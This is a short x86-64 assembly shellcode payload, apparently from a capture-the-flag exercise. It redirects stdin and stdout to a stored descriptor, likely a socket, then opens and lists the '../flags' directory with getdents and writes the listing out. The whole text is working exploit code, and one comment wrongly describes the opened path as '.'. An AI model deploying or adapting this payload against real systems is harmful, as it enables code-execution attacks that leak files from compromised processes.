_start:
  mov rdx, rdi
  shr rdx, 16
  shl rdx, 16
  add dx, 0xb00
  mov r15, rdx                  ; r15 = 0x600b00

  mov rdx, r15
  add dl, 0x24
  mov rdi, [rdx]
  xor esi, esi
  mov al, 33
  syscall                       ; dup2([0x600b24], 0)

  mov rdx, r15
  add dl, 0x24
  mov rdi, [rdx]
  xor esi, esi
  inc esi
  mov al, 33
  syscall                       ; dup2([0x600b24], 1)

  mov rdx, r15
  add dx, 0x100
  mov rax, 0x7367616c662f2e2e
  mov [rdx], rax
  
  mov rdi, rdx
  xor eax, eax
  xor edx, edx
  xor esi, esi
  mov al, 2
  syscall                       ; open(".", O_RDONLY)

  mov rdi, rax
  xor edx, edx
  xor eax, eax
  mov dx, 0x3210
  sub rsp, rdx
  mov rsi, rsp
  mov al, 78
  syscall                       ; getdents(fd, rsp, 0x3210)

  xchg rax, rdx
  xor eax, eax
  xor edi, edi
  inc eax
  inc edi
  mov rsi, rsp
  syscall                       ; write(1, rsp, rdx)
  
here:
  nop
  jmp here
  
  db  'E', 'O', 'F'
